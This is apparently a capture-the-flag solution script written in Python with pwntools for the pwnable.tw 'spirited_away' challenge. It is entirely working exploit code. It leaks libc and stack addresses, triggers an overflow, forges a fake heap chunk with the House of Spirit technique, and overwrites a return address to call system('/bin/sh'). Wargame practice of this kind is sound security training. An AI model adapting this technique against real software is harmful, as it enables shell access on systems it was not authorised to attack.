from pwn import *
 
def create(name,age,reason,comment):
    # Please enter your name: 
    p.recvuntil('name: ')
    p.send(name)
    # Please enter your age:  
    p.recvuntil('age: ')
    p.sendline(age)
    # Why did you came to see this movie? 
    p.recvuntil('movie? ')
    p.send(reason)
    # Please enter your comment: 
    p.recvuntil('comment: ')
    p.send(comment)
 
 
def nextOne(chooise):
    # Would you like to leave another comment? <y/n>: 
    p.recvuntil('<y/n>: ')
    p.send(chooise)
 
 
def exploit():
     
    # leaking libc
    # gdb.attach(p, 'b*0x080486F8\nc')
    create('1'*0x3c,'-2','2'*0x18,'3'*0x3c)
    p.recvuntil('Reason: ')
    p.recvuntil('2'*0x18)
    _IO_file_sync = u32(p.recv(4))-7
    log.info('_IO_file_sync:'+hex(_IO_file_sync)) # print info
    libc.address = _IO_file_sync-libc.symbols['_IO_file_sync']
    system = libc.symbols['system']
    log.info('system:'+hex(system))
    binsh_addr = next(libc.search(b'/bin/sh'))
    log.info('binsh_addr:'+hex(binsh_addr))
    nextOne('y')
     
    # leaking stack
    # gdb.attach(p, 'b*0x080486F8\nc')
    create(b'1'*0x3c, b'-1', b'2'*0x50, b'3'*0x3c)
    p.recvuntil('Reason: ')
    p.recvuntil('2'*0x50)
    stack = u32(p.recv(4))
    log.info('stack:'+hex(stack))
    nextOne('y')
     
    # trigger stack overflow
    force = log.progress('Trigger')
    for i in range(100):
        force.status("{0}".format(i))
        create('1'*0x3c, str(i), b'2'*0x50, b'3'*0x3c)
        nextOne(b'y')
     
    # House of Spirit
    # gdb.attach(p, 'b *0x80488C6')
    reason = p32(0x41)+60*b'1'+p32(0x1234)
    reason = reason.rjust(0x50,b'2')
    comment = b'3'*0x50
    comment += p32(100)
    comment += p32(stack-0x60) 
    create(b'1'*0x3c, b'100',reason,comment)
    nextOne(b'y')
     
    payload = b'A'*68
    payload += p32(system)
    payload += p32(0xdeadbeef)
    payload += p32(binsh_addr)
     
    create(payload,b'101', b'2'*0x50, b'3'*0x3c)
    nextOne('n')
    p.interactive()
 
 
if __name__ == '__main__':
    context.binary = "./spirited_away"
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    e = ELF('./spirited_away') 
    flag = 1
    if flag: 
        p = remote("chall.pwnable.tw", 10204)
        libc = ELF('./libc_32.so.6') 
        exploit()
    else:
        p = process('./spirited_away')
        libc = ELF('/lib/i386-linux-gnu/libc.so.6')
        exploit()